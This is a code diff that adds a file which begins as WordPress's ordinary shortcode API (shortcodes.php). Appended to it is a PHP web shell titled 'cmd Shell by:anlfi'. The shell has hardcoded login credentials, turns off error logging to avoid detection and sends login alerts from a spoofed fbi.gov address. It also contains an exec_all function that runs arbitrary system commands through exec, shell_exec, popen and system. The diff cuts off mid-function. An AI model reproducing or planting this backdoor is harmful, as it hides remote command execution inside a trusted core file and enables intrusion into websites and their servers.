@@ -1,0 +1,1314 @@
+<?php
+/**
+ * WordPress API for creating bbcode-like tags or what WordPress calls
+ * "shortcodes". The tag and attribute parsing or regular expression code is
+ * based on the Textpattern tag parser.
+ *
+ * A few examples are below:
+ *
+ * [shortcode /]
+ * [shortcode foo="bar" baz="bing" /]
+ * [shortcode foo="bar"]content[/shortcode]
+ *
+ * Shortcode tags support attributes and enclosed content, but does not entirely
+ * support inline shortcodes in other shortcodes. You will have to call the
+ * shortcode parser in your function to account for that.
+ *
+ * {@internal
+ * Please be aware that the above note was made during the beta of WordPress 2.6
+ * and in the future may not be accurate. Please update the note when it is no
+ * longer the case.}}
+ *
+ * To apply shortcode tags to content:
+ *
+ *     $out = do_shortcode( $content );
+ *
+ * @link https://developer.wordpress.org/plugins/shortcodes/
+ *
+ * @package WordPress
+ * @subpackage Shortcodes
+ * @since 2.5.0
+ */
+
+/**
+ * Container for storing shortcode tags and their hook to call for the shortcode
+ *
+ * @since 2.5.0
+ *
+ * @name $shortcode_tags
+ * @var array
+ * @global array $shortcode_tags
+ */
+$shortcode_tags = array();
+
+/**
+ * Adds a new shortcode.
+ *
+ * Care should be taken through prefixing or other means to ensure that the
+ * shortcode tag being added is unique and will not conflict with other,
+ * already-added shortcode tags. In the event of a duplicated tag, the tag
+ * loaded last will take precedence.
+ *
+ * @since 2.5.0
+ *
+ * @global array $shortcode_tags
+ *
+ * @param string   $tag      Shortcode tag to be searched in post content.
+ * @param callable $callback The callback function to run when the shortcode is found.
+ *                           Every shortcode callback is passed three parameters by default,
+ *                           including an array of attributes (`$atts`), the shortcode content
+ *                           or null if not set (`$content`), and finally the shortcode tag
+ *                           itself (`$shortcode_tag`), in that order.
+ */
+function add_shortcode( $tag, $callback ) {
+	global $shortcode_tags;
+
+	if ( '' === trim( $tag ) ) {
+		$message = __( 'Invalid shortcode name: Empty name given.' );
+		_doing_it_wrong( __FUNCTION__, $message, '4.4.0' );
+		return;
+	}
+
+	if ( 0 !== preg_match( '@[<>&/\[\]\x00-\x20=]@', $tag ) ) {
+		/* translators: 1: Shortcode name, 2: Space-separated list of reserved characters. */
+		$message = sprintf( __( 'Invalid shortcode name: %1$s. Do not use spaces or reserved characters: %2$s' ), $tag, '& / < > [ ] =' );
+		_doing_it_wrong( __FUNCTION__, $message, '4.4.0' );
+		return;
+	}
+
+	$shortcode_tags[ $tag ] = $callback;
+}
+
+/**
+ * Removes hook for shortcode.
+ *
+ * @since 2.5.0
+ *
+ * @global array $shortcode_tags
+ *
+ * @param string $tag Shortcode tag to remove hook for.
+ */
+function remove_shortcode( $tag ) {
+	global $shortcode_tags;
+
+	unset( $shortcode_tags[ $tag ] );
+}
+
+/**
+ * Clear all shortcodes.
+ *
+ * This function is simple, it clears all of the shortcode tags by replacing the
+ * shortcodes global by a empty array. This is actually a very efficient method
+ * for removing all shortcodes.
+ *
+ * @since 2.5.0
+ *
+ * @global array $shortcode_tags
+ */
+function remove_all_shortcodes() {
+	global $shortcode_tags;
+
+	$shortcode_tags = array();
+}
+
+/**
+ * Whether a registered shortcode exists named $tag
+ *
+ * @since 3.6.0
+ *
+ * @global array $shortcode_tags List of shortcode tags and their callback hooks.
+ *
+ * @param string $tag Shortcode tag to check.
+ * @return bool Whether the given shortcode exists.
+ */
+function shortcode_exists( $tag ) {
+	global $shortcode_tags;
+	return array_key_exists( $tag, $shortcode_tags );
+}
+
+/**
+ * Whether the passed content contains the specified shortcode
+ *
+ * @since 3.6.0
+ *
+ * @global array $shortcode_tags
+ *
+ * @param string $content Content to search for shortcodes.
+ * @param string $tag     Shortcode tag to check.
+ * @return bool Whether the passed content contains the given shortcode.
+ */
+function has_shortcode( $content, $tag ) {
+	if ( false === strpos( $content, '[' ) ) {
+		return false;
+	}
+
+	if ( shortcode_exists( $tag ) ) {
+		preg_match_all( '/' . get_shortcode_regex() . '/', $content, $matches, PREG_SET_ORDER );
+		if ( empty( $matches ) ) {
+			return false;
+		}
+
+		foreach ( $matches as $shortcode ) {
+			if ( $tag === $shortcode[2] ) {
+				return true;
+			} elseif ( ! empty( $shortcode[5] ) && has_shortcode( $shortcode[5], $tag ) ) {
+				return true;
+			}
+		}
+	}
+	return false;
+}
+
+/**
+ * Search content for shortcodes and filter shortcodes through their hooks.
+ *
+ * This function is an alias for do_shortcode().
+ *
+ * @since 5.4.0
+ *
+ * @see do_shortcode()
+ *
+ * @param string $content     Content to search for shortcodes.
+ * @param bool   $ignore_html When true, shortcodes inside HTML elements will be skipped.
+ *                            Default false.
+ * @return string Content with shortcodes filtered out.
+ */
+function apply_shortcodes( $content, $ignore_html = false ) {
+	return do_shortcode( $content, $ignore_html );
+}
+
+/**
+ * Search content for shortcodes and filter shortcodes through their hooks.
+ *
+ * If there are no shortcode tags defined, then the content will be returned
+ * without any filtering. This might cause issues when plugins are disabled but
+ * the shortcode will still show up in the post or content.
+ *
+ * @since 2.5.0
+ *
+ * @global array $shortcode_tags List of shortcode tags and their callback hooks.
+ *
+ * @param string $content     Content to search for shortcodes.
+ * @param bool   $ignore_html When true, shortcodes inside HTML elements will be skipped.
+ *                            Default false.
+ * @return string Content with shortcodes filtered out.
+ */
+function do_shortcode( $content, $ignore_html = false ) {
+	global $shortcode_tags;
+
+	if ( false === strpos( $content, '[' ) ) {
+		return $content;
+	}
+
+	if ( empty( $shortcode_tags ) || ! is_array( $shortcode_tags ) ) {
+		return $content;
+	}
+
+	// Find all registered tag names in $content.
+	preg_match_all( '@\[([^<>&/\[\]\x00-\x20=]++)@', $content, $matches );
+	$tagnames = array_intersect( array_keys( $shortcode_tags ), $matches[1] );
+
+	if ( empty( $tagnames ) ) {
+		return $content;
+	}
+
+	$content = do_shortcodes_in_html_tags( $content, $ignore_html, $tagnames );
+
+	$pattern = get_shortcode_regex( $tagnames );
+	$content = preg_replace_callback( "/$pattern/", 'do_shortcode_tag', $content );
+
+	// Always restore square braces so we don't break things like <!--[if IE ]>.
+	$content = unescape_invalid_shortcodes( $content );
+
+	return $content;
+}
+
+/**
+ * Retrieve the shortcode regular expression for searching.
+ *
+ * The regular expression combines the shortcode tags in the regular expression
+ * in a regex class.
+ *
+ * The regular expression contains 6 different sub matches to help with parsing.
+ *
+ * 1 - An extra [ to allow for escaping shortcodes with double [[]]
+ * 2 - The shortcode name
+ * 3 - The shortcode argument list
+ * 4 - The self closing /
+ * 5 - The content of a shortcode when it wraps some content.
+ * 6 - An extra ] to allow for escaping shortcodes with double [[]]
+ *
+ * @since 2.5.0
+ * @since 4.4.0 Added the `$tagnames` parameter.
+ *
+ * @global array $shortcode_tags
+ *
+ * @param array $tagnames Optional. List of shortcodes to find. Defaults to all registered shortcodes.
+ * @return string The shortcode search regular expression
+ */
+function get_shortcode_regex( $tagnames = null ) {
+	global $shortcode_tags;
+
+	if ( empty( $tagnames ) ) {
+		$tagnames = array_keys( $shortcode_tags );
+	}
+	$tagregexp = implode( '|', array_map( 'preg_quote', $tagnames ) );
+
+	// WARNING! Do not change this regex without changing do_shortcode_tag() and strip_shortcode_tag().
+	// Also, see shortcode_unautop() and shortcode.js.
+
+	// phpcs:disable Squiz.Strings.ConcatenationSpacing.PaddingFound -- don't remove regex indentation
+	return '\\['                             // Opening bracket.
+		. '(\\[?)'                           // 1: Optional second opening bracket for escaping shortcodes: [[tag]].
+		. "($tagregexp)"                     // 2: Shortcode name.
+		. '(?![\\w-])'                       // Not followed by word character or hyphen.
+		. '('                                // 3: Unroll the loop: Inside the opening shortcode tag.
+		.     '[^\\]\\/]*'                   // Not a closing bracket or forward slash.
+		.     '(?:'
+		.         '\\/(?!\\])'               // A forward slash not followed by a closing bracket.
+		.         '[^\\]\\/]*'               // Not a closing bracket or forward slash.
+		.     ')*?'
+		. ')'
+		. '(?:'
+		.     '(\\/)'                        // 4: Self closing tag...
+		.     '\\]'                          // ...and closing bracket.
+		. '|'
+		.     '\\]'                          // Closing bracket.
+		.     '(?:'
+		.         '('                        // 5: Unroll the loop: Optionally, anything between the opening and closing shortcode tags.
+		.             '[^\\[]*+'             // Not an opening bracket.
+		.             '(?:'
+		.                 '\\[(?!\\/\\2\\])' // An opening bracket not followed by the closing shortcode tag.
+		.                 '[^\\[]*+'         // Not an opening bracket.
+		.             ')*+'
+		.         ')'
+		.         '\\[\\/\\2\\]'             // Closing shortcode tag.
+		.     ')?'
+		. ')'
+		. '(\\]?)';                          // 6: Optional second closing brocket for escaping shortcodes: [[tag]].
+	// phpcs:enable
+}
+
+/**
+ * Regular Expression callable for do_shortcode() for calling shortcode hook.
+ *
+ * @see get_shortcode_regex() for details of the match array contents.
+ *
+ * @since 2.5.0
+ * @access private
+ *
+ * @global array $shortcode_tags
+ *
+ * @param array $m Regular expression match array.
+ * @return string|false Shortcode output on success, false on failure.
+ */
+function do_shortcode_tag( $m ) {
+	global $shortcode_tags;
+
+	// Allow [[foo]] syntax for escaping a tag.
+	if ( '[' === $m[1] && ']' === $m[6] ) {
+		return substr( $m[0], 1, -1 );
+	}
+
+	$tag  = $m[2];
+	$attr = shortcode_parse_atts( $m[3] );
+
+	if ( ! is_callable( $shortcode_tags[ $tag ] ) ) {
+		/* translators: %s: Shortcode tag. */
+		$message = sprintf( __( 'Attempting to parse a shortcode without a valid callback: %s' ), $tag );
+		_doing_it_wrong( __FUNCTION__, $message, '4.3.0' );
+		return $m[0];
+	}
+
+	/**
+	 * Filters whether to call a shortcode callback.
+	 *
+	 * Returning a non-false value from filter will short-circuit the
+	 * shortcode generation process, returning that value instead.
+	 *
+	 * @since 4.7.0
+	 *
+	 * @param false|string $return      Short-circuit return value. Either false or the value to replace the shortcode with.
+	 * @param string       $tag         Shortcode name.
+	 * @param array|string $attr        Shortcode attributes array or empty string.
+	 * @param array        $m           Regular expression match array.
+	 */
+	$return = apply_filters( 'pre_do_shortcode_tag', false, $tag, $attr, $m );
+	if ( false !== $return ) {
+		return $return;
+	}
+
+	$content = isset( $m[5] ) ? $m[5] : null;
+
+	$output = $m[1] . call_user_func( $shortcode_tags[ $tag ], $attr, $content, $tag ) . $m[6];
+
+	/**
+	 * Filters the output created by a shortcode callback.
+	 *
+	 * @since 4.7.0
+	 *
+	 * @param string       $output Shortcode output.
+	 * @param string       $tag    Shortcode name.
+	 * @param array|string $attr   Shortcode attributes array or empty string.
+	 * @param array        $m      Regular expression match array.
+	 */
+	return apply_filters( 'do_shortcode_tag', $output, $tag, $attr, $m );
+}
+
+/**
+ * Search only inside HTML elements for shortcodes and process them.
+ *
+ * Any [ or ] characters remaining inside elements will be HTML encoded
+ * to prevent interference with shortcodes that are outside the elements.
+ * Assumes $content processed by KSES already.  Users with unfiltered_html
+ * capability may get unexpected output if angle braces are nested in tags.
+ *
+ * @since 4.2.3
+ *
+ * @param string $content     Content to search for shortcodes.
+ * @param bool   $ignore_html When true, all square braces inside elements will be encoded.
+ * @param array  $tagnames    List of shortcodes to find.
+ * @return string Content with shortcodes filtered out.
+ */
+function do_shortcodes_in_html_tags( $content, $ignore_html, $tagnames ) {
+	// Normalize entities in unfiltered HTML before adding placeholders.
+	$trans   = array(
+		'&#91;' => '&#091;',
+		'&#93;' => '&#093;',
+	);
+	$content = strtr( $content, $trans );
+	$trans   = array(
+		'[' => '&#91;',
+		']' => '&#93;',
+	);
+
+	$pattern = get_shortcode_regex( $tagnames );
+	$textarr = wp_html_split( $content );
+
+	foreach ( $textarr as &$element ) {
+		if ( '' === $element || '<' !== $element[0] ) {
+			continue;
+		}
+
+		$noopen  = false === strpos( $element, '[' );
+		$noclose = false === strpos( $element, ']' );
+		if ( $noopen || $noclose ) {
+			// This element does not contain shortcodes.
+			if ( $noopen xor $noclose ) {
+				// Need to encode stray '[' or ']' chars.
+				$element = strtr( $element, $trans );
+			}
+			continue;
+		}
+
+		if ( $ignore_html || '<!--' === substr( $element, 0, 4 ) || '<![CDATA[' === substr( $element, 0, 9 ) ) {
+			// Encode all '[' and ']' chars.
+			$element = strtr( $element, $trans );
+			continue;
+		}
+
+		$attributes = wp_kses_attr_parse( $element );
+		if ( false === $attributes ) {
+			// Some plugins are doing things like [name] <[email]>.
+			if ( 1 === preg_match( '%^<\s*\[\[?[^\[\]]+\]%', $element ) ) {
+				$element = preg_replace_callback( "/$pattern/", 'do_shortcode_tag', $element );
+			}
+
+			// Looks like we found some crazy unfiltered HTML. Skipping it for sanity.
+			$element = strtr( $element, $trans );
+			continue;
+		}
+
+		// Get element name.
+		$front   = array_shift( $attributes );
+		$back    = array_pop( $attributes );
+		$matches = array();
+		preg_match( '%[a-zA-Z0-9]+%', $front, $matches );
+		$elname = $matches[0];
+
+		// Look for shortcodes in each attribute separately.
+		foreach ( $attributes as &$attr ) {
+			$open  = strpos( $attr, '[' );
+			$close = strpos( $attr, ']' );
+			if ( false === $open || false === $close ) {
+				continue; // Go to next attribute. Square braces will be escaped at end of loop.
+			}
+			$double = strpos( $attr, '"' );
+			$single = strpos( $attr, "'" );
+			if ( ( false === $single || $open < $single ) && ( false === $double || $open < $double ) ) {
+				/*
+				 * $attr like '[shortcode]' or 'name = [shortcode]' implies unfiltered_html.
+				 * In this specific situation we assume KSES did not run because the input
+				 * was written by an administrator, so we should avoid changing the output
+				 * and we do not need to run KSES here.
+				 */
+				$attr = preg_replace_callback( "/$pattern/", 'do_shortcode_tag', $attr );
+			} else {
+				// $attr like 'name = "[shortcode]"' or "name = '[shortcode]'".
+				// We do not know if $content was unfiltered. Assume KSES ran before shortcodes.
+				$count    = 0;
+				$new_attr = preg_replace_callback( "/$pattern/", 'do_shortcode_tag', $attr, -1, $count );
+				if ( $count > 0 ) {
+					// Sanitize the shortcode output using KSES.
+					$new_attr = wp_kses_one_attr( $new_attr, $elname );
+					if ( '' !== trim( $new_attr ) ) {
+						// The shortcode is safe to use now.
+						$attr = $new_attr;
+					}
+				}
+			}
+		}
+		$element = $front . implode( '', $attributes ) . $back;
+
+		// Now encode any remaining '[' or ']' chars.
+		$element = strtr( $element, $trans );
+	}
+
+	$content = implode( '', $textarr );
+
+	return $content;
+}
+
+/**
+ * Remove placeholders added by do_shortcodes_in_html_tags().
+ *
+ * @since 4.2.3
+ *
+ * @param string $content Content to search for placeholders.
+ * @return string Content with placeholders removed.
+ */
+function unescape_invalid_shortcodes( $content ) {
+	// Clean up entire string, avoids re-parsing HTML.
+	$trans = array(
+		'&#91;' => '[',
+		'&#93;' => ']',
+	);
+
+	$content = strtr( $content, $trans );
+
+	return $content;
+}
+
+/**
+ * Retrieve the shortcode attributes regex.
+ *
+ * @since 4.4.0
+ *
+ * @return string The shortcode attribute regular expression
+ */
+function get_shortcode_atts_regex() {
+	return '/([\w-]+)\s*=\s*"([^"]*)"(?:\s|$)|([\w-]+)\s*=\s*\'([^\']*)\'(?:\s|$)|([\w-]+)\s*=\s*([^\s\'"]+)(?:\s|$)|"([^"]*)"(?:\s|$)|\'([^\']*)\'(?:\s|$)|(\S+)(?:\s|$)/';
+}
+
+/**
+ * Retrieve all attributes from the shortcodes tag.
+ *
+ * The attributes list has the attribute name as the key and the value of the
+ * attribute as the value in the key/value pair. This allows for easier
+ * retrieval of the attributes, since all attributes have to be known.
+ *
+ * @since 2.5.0
+ *
+ * @param string $text
+ * @return array|string List of attribute values.
+ *                      Returns empty array if '""' === trim( $text ).
+ *                      Returns empty string if '' === trim( $text ).
+ *                      All other matches are checked for not empty().
+ */
+function shortcode_parse_atts( $text ) {
+	$atts    = array();
+	$pattern = get_shortcode_atts_regex();
+	$text    = preg_replace( "/[\x{00a0}\x{200b}]+/u", ' ', $text );
+	if ( preg_match_all( $pattern, $text, $match, PREG_SET_ORDER ) ) {
+		foreach ( $match as $m ) {
+			if ( ! empty( $m[1] ) ) {
+				$atts[ strtolower( $m[1] ) ] = stripcslashes( $m[2] );
+			} elseif ( ! empty( $m[3] ) ) {
+				$atts[ strtolower( $m[3] ) ] = stripcslashes( $m[4] );
+			} elseif ( ! empty( $m[5] ) ) {
+				$atts[ strtolower( $m[5] ) ] = stripcslashes( $m[6] );
+			} elseif ( isset( $m[7] ) && strlen( $m[7] ) ) {
+				$atts[] = stripcslashes( $m[7] );
+			} elseif ( isset( $m[8] ) && strlen( $m[8] ) ) {
+				$atts[] = stripcslashes( $m[8] );
+			} elseif ( isset( $m[9] ) ) {
+				$atts[] = stripcslashes( $m[9] );
+			}
+		}
+
+		// Reject any unclosed HTML elements.
+		foreach ( $atts as &$value ) {
+			if ( false !== strpos( $value, '<' ) ) {
+				if ( 1 !== preg_match( '/^[^<]*+(?:<[^>]*+>[^<]*+)*+$/', $value ) ) {
+					$value = '';
+				}
+			}
+		}
+	} else {
+		$atts = ltrim( $text );
+	}
+
+	return $atts;
+}
+
+/**
+ * Combine user attributes with known attributes and fill in defaults when needed.
+ *
+ * The pairs should be considered to be all of the attributes which are
+ * supported by the caller and given as a list. The returned attributes will
+ * only contain the attributes in the $pairs list.
+ *
+ * If the $atts list has unsupported attributes, then they will be ignored and
+ * removed from the final returned list.
+ *
+ * @since 2.5.0
+ *
+ * @param array  $pairs     Entire list of supported attributes and their defaults.
+ * @param array  $atts      User defined attributes in shortcode tag.
+ * @param string $shortcode Optional. The name of the shortcode, provided for context to enable filtering
+ * @return array Combined and filtered attribute list.
+ */
+function shortcode_atts( $pairs, $atts, $shortcode = '' ) {
+	$atts = (array) $atts;
+	$out  = array();
+	foreach ( $pairs as $name => $default ) {
+		if ( array_key_exists( $name, $atts ) ) {
+			$out[ $name ] = $atts[ $name ];
+		} else {
+			$out[ $name ] = $default;
+		}
+	}
+
+	if ( $shortcode ) {
+		/**
+		 * Filters shortcode attributes.
+		 *
+		 * If the third parameter of the shortcode_atts() function is present then this filter is available.
+		 * The third parameter, $shortcode, is the name of the shortcode.
+		 *
+		 * @since 3.6.0
+		 * @since 4.4.0 Added the `$shortcode` parameter.
+		 *
+		 * @param array  $out       The output array of shortcode attributes.
+		 * @param array  $pairs     The supported attributes and their defaults.
+		 * @param array  $atts      The user defined shortcode attributes.
+		 * @param string $shortcode The shortcode name.
+		 */
+		$out = apply_filters( "shortcode_atts_{$shortcode}", $out, $pairs, $atts, $shortcode );
+	}
+
+	return $out;
+}
+
+/**
+ * Remove all shortcode tags from the given content.
+ *
+ * @since 2.5.0
+ *
+ * @global array $shortcode_tags
+ *
+ * @param string $content Content to remove shortcode tags.
+ * @return string Content without shortcode tags.
+ */
+function strip_shortcodes( $content ) {
+	global $shortcode_tags;
+
+	if ( false === strpos( $content, '[' ) ) {
+		return $content;
+	}
+
+	if ( empty( $shortcode_tags ) || ! is_array( $shortcode_tags ) ) {
+		return $content;
+	}
+
+	// Find all registered tag names in $content.
+	preg_match_all( '@\[([^<>&/\[\]\x00-\x20=]++)@', $content, $matches );
+
+	$tags_to_remove = array_keys( $shortcode_tags );
+
+	/**
+	 * Filters the list of shortcode tags to remove from the content.
+	 *
+	 * @since 4.7.0
+	 *
+	 * @param array  $tags_to_remove Array of shortcode tags to remove.
+	 * @param string $content        Content shortcodes are being removed from.
+	 */
+	$tags_to_remove = apply_filters( 'strip_shortcodes_tagnames', $tags_to_remove, $content );
+
+	$tagnames = array_intersect( $tags_to_remove, $matches[1] );
+
+	if ( empty( $tagnames ) ) {
+		return $content;
+	}
+
+	$content = do_shortcodes_in_html_tags( $content, true, $tagnames );
+
+	$pattern = get_shortcode_regex( $tagnames );
+	$content = preg_replace_callback( "/$pattern/", 'strip_shortcode_tag', $content );
+
+	// Always restore square braces so we don't break things like <!--[if IE ]>.
+	$content = unescape_invalid_shortcodes( $content );
+
+	return $content;
+}
+
+/**
+ * Strips a shortcode tag based on RegEx matches against post content.
+ *
+ * @since 3.3.0
+ *
+ * @param array $m RegEx matches against post content.
+ * @return string|false The content stripped of the tag, otherwise false.
+ */
+function strip_shortcode_tag( $m ) {
+	// Allow [[foo]] syntax for escaping a tag.
+	if ( '[' === $m[1] && ']' === $m[6] ) {
+		return substr( $m[0], 1, -1 );
+	}
+
+	return $m[1] . $m[6];
+}
+<?php
+
+/*
+==============
+*/
+
+error_reporting(0);
+ini_set('max_execution_time',0);
+
+
+// ------------------------------------- Some header Functions (Need to be on top) ---------------------------------\
+
+/**************** Defines *********************************/
+
+$user = "anlfi";
+$pass = "XXX";
+$sm = @ini_get('safe_mode');
+$SEPARATOR = '/'; // Default Directory separator
+$os = "N/D";
+if(stristr(php_uname(),"Windows"))
+{
+        $SEPARATOR = '\\';
+        $os = "Windows";
+}
+else if(stristr(php_uname(),"Linux"))
+{
+        $os = "Linux";
+}
+
+
+//*************************************************************/
+
+// -------------- Traceback Functions
+
+function sendLoginAlert()
+{
+    global $ownerEmail;
+    global $url;
+    $accesedIp = $_SERVER['REMOTE_ADDR'];
+    $randomInt = rand(0,1000000);           # to avoid id blocking
+    $from = "ani-shell$[email]randomInt@fbi.gov[/email]"; 
+    
+    //echo $from;
+    
+    if(function_exists('mail'))
+    {
+        $subject = "Shell Accessed -- Ani-Shell --";
+        $message = "
+Hey Owner ,
+        
+        Your Shell(Ani-Shell) located at $url was accessed by $accesedIp
+        
+        If its not you :-
+        
+        1. Please check if the shell is secured.
+        2. Change your user name and Password.
+        3. Check if lock is 0n!
+        and Kick that ****** out!
+        
+        Thanking You
+        
+Yours Faithfully
+Ani-Shell
+        ";
+        mail($ownerEmail,$subject,$message,'From:'.$from);
+    }
+}
+
+//---------------------------------------------------------
+
+
+if(function_exists('session_start') && $lock == 'on')
+{
+    session_start();
+}
+else
+{
+    // The lock will be set to 'off' if the session_start fuction is disabled i.e if sessions are not supported 
+    $lock = 'off';
+}
+
+//logout
+
+if(isset($_GET['logout']) && $lock == 'on')
+{
+    $_SESSION['authenticated'] = 0;
+    session_destroy();
+    header("location: ".$_SERVER['PHP_SELF']);
+}
+
+ini_set('max_execution_time',0);
+
+
+
+/***************** Restoring *******************************/
+
+
+ini_restore("safe_mode");
+ini_restore("open_basedir");
+
+if(function_exists('ini_set'))
+{
+    ini_set('error_log',NULL);  // No alarming logs
+    ini_set('log_errors',0);    // No logging of errors
+}
+
+else
+{
+    ini_alter('error_log',NULL);
+    ini_alter('log_errors',0);
+}
+
+// ----------------------------------------------------------------------------------------------------------------
+
+
+?>
+<html>
+<head>
+<title>cmd Shell by:anlfi</title>
+
+
+<style>
+/*
+==========================    
+    CSS Section
+==========================
+*/
+*{
+    padding:0;
+    margin:0;
+}
+
+.alert
+{
+    background:red;
+    color:white;
+    font-weight:bold;
+}
+td.info
+{
+    width:0px;
+}
+
+.bind 
+{
+    border: 1px solid #333333;
+    margin: 15px auto 0;
+    font-size: small;
+}
+
+div.end *
+{
+    font-size:small;
+}
+
+div.end 
+{
+    width:100%;
+    background:#222;
+}
+
+p.blink
+{
+    text-decoration: blink;
+}
+
+body 
+{
+    background-color:black;
+    color:rgb(35,182,39);
+    font-family:Tahoma,Verdana,Arial;
+    font-size: small;
+}
+
+input.own {
+    background-color: Green;
+    color: white;
+    border : 1px solid #ccc;
+}
+
+blockquote.small
+{
+    font-size: smaller;
+    color: silver;
+    text-align: center;
+}
+
+table.files
+{
+    border-spacing: 10px;
+    font-size: small;
+}
+
+h1 {
+    padding: 4px;
+    padding-bottom: 0px;
+    margin-right : 5px;
+}
+div.logo
+{
+    border-right: 1px aqua solid;
+}
+div.header
+{
+    padding-left: 5px;
+    font-size: small;
+    text-align: left;
+}
+div.nav
+{
+    margin-top:1px;
+    height:30px;
+    background-color: #ccc;
+}
+div.nav ul
+{
+    list-style: none;
+    padding: 4px;
+}
+div.nav li
+{
+    float: left;
+    margin-right: 10px;
+    text-align:center;
+}
+textarea.cmd
+{
+    border : 1px solid #111;
+    background-color : green;
+    font-family: Shell;
+    color : white;
+    margin-top: 10px;
+    font-size:small;
+}
+
+input.cmd
+{
+    background-color:black;
+    color: white;
+    width: 400px;
+    border : 1px solid #ccc;
+
+}
+td.maintext
+{
+    font-size: large;
+}
+#margins
+{
+    margin-left: 10px;
+    margin-top: 10px;
+    color:white;
+}
+table.top
+{
+    border-bottom: 1px solid aqua;
+    width: 100%;
+}
+#borders
+{
+    border-top : 1px solid aqua;
+    border-left:1px solid aqua;
+    border-bottom: 1px solid aqua;
+    border-right: 1px solid aqua;
+    margin-bottom:0;
+}
+td.file a , .file a
+{
+    color : aqua;
+    text-decoration:none;
+}
+a.dir
+{
+    color:white;
+    font-weight:bold;
+    text-decoration:none;
+}
+td.dir a
+{
+    color : white;
+    text-decoration:none;
+}
+td.download,td.download2
+{
+    color:green;
+}
+#spacing
+{
+    padding:10px;
+    margin-left:200px;
+}
+th.header
+{
+    background: none repeat scroll 0 0 #191919;
+    color: white;
+    border-bottom : 1px solid #333333;
+}
+p.warning
+{
+    background : red;
+    color: white;
+}
+//
+
+--------------------------------CSS END------------------------------------------------------
+
+*/
+</style>
+</head>
+
+<body text="rgb(39,245,10)" bgcolor="black">
+<?php
+
+if(isset($_POST['user']) && isset($_POST['pass']) && $lock == 'on')
+{
+    if( $_POST['user'] == $user &&
+         $_POST['pass'] == $pass )
+    {
+            $_SESSION['authenticated'] = 1;
+            // --------------------- Tracebacks --------------------------------
+            if($tracebackFeature == 'On')
+            {
+                sendLoginAlert();
+            }
+            // ------------------------------------------------------------------
+    }
+}
+
+if($lock == 'off')
+{?>
+    <p class="warning"><b>Lock is Switched Off! , The shell can be accessed by anyone!</b></p>
+<?php
+}
+
+if($lock == 'on' && (!isset($_SESSION['authenticated']) || $_SESSION['authenticated']!=1) )
+{
+
+?>
+<table>
+    <tbody>
+        <tr>
+            <td width="500px">
+        <pre>
+<font color="Orange">
+<b>
+[]--------------cmd Shell-----------------
+</b>
+</pre>
+            </td>
+            <td>
+                <!-- <h1><?php // echo $greeting;?></h1> 
+                <img src="Logo_03.png" class="imageForm" /> -->
+                <form method="POST" action="<?php echo $_SERVER['PHP_SELF'];?>">
+                <input name="user" value="Username"/> <input name="pass" type="" value=""/> <input class="own" type="Submit" value="in!"/>
+                </form>
+            </td>
+        </tr>
+    </tbody>
+</table>
+<?php
+}
+//---------------------------------- We are authenticated now-------------------------------------
+//Launch the shell
+else 
+{
+    //---------------------------------- Fuctions ---------------------------------------------------
+
+    function showDrives()
+    {
+        global $self;
+        foreach(range('A','Z') as $drive)
+        {
+            if(is_dir($drive.':\\'))
+            {
+                ?>
+                <a class="dir" href='<?php echo $self ?>?dir=<?php echo $drive.":\\"; ?>'>
+                    <?php echo $drive.":\\" ?>
+                </a> 
+                <?php
+            }
+        }
+    }
+
+    function HumanReadableFilesize($size)
+    {
+ 
+        $mod = 1024;
+ 
+        $units = explode(' ','B KB MB GB TB PB');
+        for ($i = 0; $size > $mod; $i++) 
+        {
+            $size /= $mod;
+        }
+ 
+        return round($size, 2) . ' ' . $units[$i];
+    }
+
+function getClientIp()
+{
+    echo $_SERVER['REMOTE_ADDR'];
+}
+
+function getServerIp()
+{
+    echo getenv('SERVER_ADDR');
+}
+function getSoftwareInfo()
+{
+    echo php_uname();
+}
+function diskSpace()
+{
+    echo HumanReadableFilesize(disk_total_space("/"));
+}
+function freeSpace()
+{
+    echo HumanReadableFilesize(disk_free_space("/"));
+}
+function getSafeMode()
+{
+        global $sm;
+                echo($sm?"ON :( :'( (Most of the Features will Not Work!)":"OFF");
+        
+}
+
+function getDisabledFunctions()
+{
+    if(!ini_get('disable_functions'))
+    {
+                echo "None";
+    }
+    else
+    {
+                        echo @ini_get('disable_functions');
+    }
+}
+
+function getFilePermissions($file)
+{
+    
+$perms = fileperms($file);
+
+if (($perms & 0xC000) == 0xC000) {
+    // Socket
+    $info = 's';
+} elseif (($perms & 0xA000) == 0xA000) {
+    // Symbolic Link
+    $info = 'l';
+} elseif (($perms & 0x8000) == 0x8000) {
+    // Regular
+    $info = '-';
+} elseif (($perms & 0x6000) == 0x6000) {
+    // Block special
+    $info = 'b';
+} elseif (($perms & 0x4000) == 0x4000) {
+    // Directory
+    $info = 'd';
+} elseif (($perms & 0x2000) == 0x2000) {
+    // Character special
+    $info = 'c';
+} elseif (($perms & 0x1000) == 0x1000) {
+    // FIFO pipe
+    $info = 'p';
+} else {
+    // Unknown
+    $info = 'u';
+}
+
+// Owner
+$info .= (($perms & 0x0100) ? 'r' : '-');
+$info .= (($perms & 0x0080) ? 'w' : '-');
+$info .= (($perms & 0x0040) ?
+            (($perms & 0x0800) ? 's' : 'x' ) :
+            (($perms & 0x0800) ? 'S' : '-'));
+
+// Group
+$info .= (($perms & 0x0020) ? 'r' : '-');
+$info .= (($perms & 0x0010) ? 'w' : '-');
+$info .= (($perms & 0x0008) ?
+            (($perms & 0x0400) ? 's' : 'x' ) :
+            (($perms & 0x0400) ? 'S' : '-'));
+
+// World
+$info .= (($perms & 0x0004) ? 'r' : '-');
+$info .= (($perms & 0x0002) ? 'w' : '-');
+$info .= (($perms & 0x0001) ?
+            (($perms & 0x0200) ? 't' : 'x' ) :
+            (($perms & 0x0200) ? 'T' : '-'));
+
+return $info;
+
+}
+
+/***********************************************************/
+// exec_all , A function used to execute commands , This function will only execute if the Safe Mode is
+// Turned OfF!
+/**********************************************************/
+
+
+function exec_all($command)
+{
+    
+    $output = '';
+    if(function_exists('exec'))
+    {   
+        exec($command,$output);
+        $output = join("\n",$output);
+    }
+    
+    else if(function_exists('shell_exec'))
+    {
+        $output = shell_exec($command);
+    }
+    
+    else if(function_exists('popen'))
+    {
+        $handle = popen($command , "r"); // Open the command pipe for reading
+        if(is_resource($handle))
+        {
+            if(function_exists('fread') && function_exists('feof'))
+            {
+                while(!feof($handle))
+                {
+                    $output .= fread($handle, 512);
+                }
+            }
+            else if(function_exists('fgets') && function_exists('feof'))
+            {
+                while(!feof($handle))
+                {
+                    $output .= fgets($handle,512);
+                }
+            }
+        }
+        pclose($handle);
+    }
+    
+    
+    else if(function_exists('system'))
+    {
+        ob_start(); //start output buffering
